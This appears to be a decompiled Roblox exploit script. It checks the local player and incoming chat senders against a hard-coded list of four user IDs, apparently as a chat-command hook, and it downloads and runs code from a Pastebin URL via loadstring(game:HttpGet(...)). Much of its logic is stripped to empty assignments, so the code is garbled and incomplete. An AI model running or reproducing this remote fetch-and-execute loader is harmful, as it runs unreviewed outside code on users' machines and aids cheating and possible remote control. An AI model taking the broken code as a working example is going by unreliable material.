local genv = getgenv()
local _callcloneref4 = cloneref(game:GetService('RunService'))
local _callcloneref7 = cloneref(game:GetService('Players'))
local _callcloneref10 = cloneref(game:GetService('TextChatService'))

cloneref(game:GetService('ReplicatedStorage'))
cloneref(game:GetService('SoundService'))
cloneref(game:GetService('Debris'))
cloneref(game:GetService('HttpService'))
cloneref(game:GetService('UserInputService'))

local _ = _callcloneref10.ChatVersion == Enum.ChatVersion.LegacyChatService
local _gameJobId30 = game.JobId
local _LocalPlayer31 = _callcloneref7.LocalPlayer
local _ = _LocalPlayer31.Character:FindFirstChildOfClass('Humanoid').RootPart

tostring(_LocalPlayer31)

local _ = _LocalPlayer31.DisplayName
local _ = genv[_gameJobId30]

table.find({
    [1] = 7310783780,
    [2] = 9303416937,
    [3] = 9613618539,
    [4] = 3815163752,
}, _LocalPlayer31.UserId)
_LocalPlayer31.CharacterAdded:Connect(function(_44, _44_2, _44_3, _44_4)
    _44:FindFirstChildOfClass('Humanoid')

    local _ = _44:FindFirstChildOfClass('Humanoid').RootPart

    _callcloneref4.Heartbeat:Wait()
    _44:FindFirstChildOfClass('Humanoid')

    local _ = _44:FindFirstChildOfClass('Humanoid').RootPart
    local _ = _44:FindFirstChildOfClass('Humanoid').RootPart
end)
_callcloneref10.TextChannels.RBXGeneral.MessageReceived:Connect(function(_66, _66_2, _66_3, _66_4, _66_5)
    local _TextSource67 = _66.TextSource

    table.find({
        [1] = 7310783780,
        [2] = 9303416937,
        [3] = 9613618539,
        [4] = 3815163752,
    }, _TextSource67.UserId)
    _callcloneref7:GetPlayerByUserId(_TextSource67.UserId)

    local _Text73 = _66.Text
    local _ = #_Text73

    string.sub(_Text73, 1, 1)
end)
_callcloneref4.Heartbeat:Connect(function() end)
loadstring(game:HttpGet('https://pastebin.com/raw/FadgFS5p'))()

genv[_gameJobId30] = function(_85)
    error('line 1: attempt to call a table value')
end
